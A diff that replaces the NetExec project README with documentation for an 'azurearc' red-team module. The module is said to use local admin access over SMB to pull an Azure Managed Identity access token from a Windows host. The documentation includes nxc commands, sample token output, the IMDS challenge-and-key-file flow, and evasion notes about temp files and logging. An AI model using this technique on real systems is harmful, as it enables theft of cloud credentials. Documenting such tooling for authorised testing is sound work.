@@ -1,67 +1,60 @@
-![Supported Python versions](https://img.shields.io/badge/python-3.10+-blue.svg)
-[![Twitter](https://img.shields.io/twitter/follow/al3xn3ff?label=al3x_n3ff&style=social)](https://twitter.com/intent/follow?screen_name=al3x_n3ff)
-[![Twitter](https://img.shields.io/twitter/follow/_zblurx?label=_zblurx&style=social)](https://twitter.com/intent/follow?screen_name=_zblurx)
-[![Twitter](https://img.shields.io/twitter/follow/MJHallenbeck?label=MJHallenbeck&style=social)](https://twitter.com/intent/follow?screen_name=MJHallenbeck)
-[![Twitter](https://img.shields.io/twitter/follow/mpgn_x64?label=mpgn_x64&style=social)](https://twitter.com/intent/follow?screen_name=mpgn_x64)
+# NetExec Module: `azurearc`
+Enumerates Azure Arc presence on Windows targets and, when present, retrieves a **Managed Identity access token** from the local Arc IMDS endpoint using the documented **401 challenge → `.key` file → second request** flow.
+
+* **Protocol:** SMB (requires local administrator privileges)
+* **Primary use case:** Rapidly map Arc deployment and obtain a cloud-scoped token for Azure control-plane enumeration during red team engagements.
 
 
-🚩 This is the open source repository of NetExec maintained by a community of passionate people
-# NetExec - The Network Execution Tool
+  
+## ✨ Features
 
-This project was initially created in 2015 by @byt3bl33d3r, known as CrackMapExec. In 2019 @mpgn_x64 started maintaining the project for the next 4 years, adding a lot of great tools and features. In September 2023 he retired from maintaining the project.
+* **Presence check** (`CHECK=true`): Detects Arc agent by listing well-known install paths.
+* **Token retrieval** (default): Executes the IMDS challenge/response locally on the target and returns JSON containing `access_token`.
 
-Along with many other contributors, we (NeffIsBack, Marshall-Hallenbeck, and zblurx) developed new features, bug fixes, and helped maintain the original project CrackMapExec.
-During this time, with both a private and public repository, community contributions were not easily merged into the project. The 6-8 month discrepancy between the code bases caused many development issues and heavily reduced community-driven development.
-With the end of mpgn's maintainer role, we (the remaining most active contributors) decided to maintain the project together as a fully free and open source project under the new name **NetExec** 🚀
-Going forward, our intent is to maintain a community-driven and maintained project with regular updates for everyone to use.
 
-<p align="center">
-  <!-- placeholder for nxc logo-->
-</p>
+    
+  
+# ⚙️ Usage
 
-You are on the **latest up-to-date** repository of the project NetExec (nxc) ! 🎉
+* Add the module file at:  
+  nxc/modules/azurearc.py
 
-- 🚧 If you want to report a problem, open an [Issue](https://github.com/Pennyw0rth/NetExec/issues) 
-- 🔀 If you want to contribute, open a [Pull Request](https://github.com/Pennyw0rth/NetExec/pulls)
-- 💬 If you want to discuss, open a [Discussion](https://github.com/Pennyw0rth/NetExec/discussions)
-
-## Official Discord Channel
-
-If you don't have a Github account, you can ask your questions on Discord!
-
-[![NetExec](https://discordapp.com/api/guilds/1148685154601160794/widget.png?style=banner3)](https://discord.gg/pjwUTQzg8R)
-
-# Documentation, Tutorials, Examples
-See the project's [wiki](https://netexec.wiki/) (in development) for documentation and usage examples
-
-# Installation
-Please see the installation instructions on the [wiki](https://netexec.wiki/getting-started/installation) (in development)
-
-## Linux
+  
+## Presence check only :
 ```
-sudo apt install pipx git
-pipx ensurepath
-pipx install git+https://github.com/Pennyw0rth/NetExec
+nxc smb  -u <USER> -p <PASS> -M azurearc -o CHECK=true
 ```
+## Token dump :
+```
+nxc smb 192.168.1.100 -u USER -p 'PASS' -M azurearc  
+[*] Attempting to retrieve Azure Arc Managed Identity access token  
+[+] Managed Identity token retrieved  
+{
+"access_token": "eyJhbGciOi......",
+"expires_on": "1730812345",
+"token_type": "Bearer",
+"resource": "https://management.azure.com"
+}
+```
+## 🔍 How It Works (Behavior)
+### Presence check via SMB listing:
+C:\Program Files\AzureConnectedMachineAgent*   
+C:\Program Files (x86)\AzureConnectedMachineAgent*
+### Token retrieval on target (PowerShell):
+1.GET http://localhost:40342/metadata/identity/oauth2/token?resource=...&api-version=... → expect 401 with WWW-Authenticate: Basic realm="<path to .key>" Read the .key contents (requires local admin).  
+2.Second GET with Authorization: Basic to obtain token JSON.   
+Write JSON to OUTFILE, fetch via SMB, and delete the file.
+### 📸 Screenshots
+<img width="1201" height="450" alt="2025-10-05_16h20_40" src="https://github.com/user-attachments/assets/31a6fe6a-7b17-4ead-8f4f-461993a402c8" />
+<img width="1189" height="391" alt="2025-10-05_17h29_40" src="https://github.com/user-attachments/assets/66d38783-4033-4e86-a293-f69149ceb5ff" />
 
-## Availability on Unix distributions
 
-[![Packaging status](https://repology.org/badge/vertical-allrepos/netexec.svg)](https://repology.org/project/netexec/versions)
 
-# Development
-Development guidelines and recommendations in development
+### 🔒 OPSEC & Scope Notes
+Local admin required on the target (matches Arc’s security boundary).
+Tokens are written to a temp file on the target only long enough to read back via SMB. the file is then deleted.
+Be mindful of token lifetime and endpoint logging.
+### 🧭 References
+NSIDE Attack Logic  Azure Arc - Part 1 - Escalation from On-Premises to Cloud  
+https://www.nsideattacklogic.de/azure-arc-part-1-escalation-from-on-premises-to-cloud/
 
-# Acknowledgments
-All the hard work and development over the years from everyone in the CrackMapExec project
-
-# Code Contributors
-Awesome code contributors of NetExec:
-
-[![](https://github.com/mpgn.png?size=50)](https://github.com/mpgn)
-[![](https://github.com/Marshall-Hallenbeck.png?size=50)](https://github.com/Marshall-Hallenbeck)
-[![](https://github.com/zblurx.png?size=50)](https://github.com/zblurx)
-[![](https://github.com/NeffIsBack.png?size=50)](https://github.com/NeffIsBack)
-[![](https://github.com/Hackndo.png?size=50)](https://github.com/Hackndo)
-[![](https://github.com/XiaoliChan.png?size=50)](https://github.com/XiaoliChan)
-[![](https://github.com/termanix.png?size=50)](https://github.com/termanix)
-[![](https://github.com/Dfte.png?size=50)](https://github.com/Dfte)
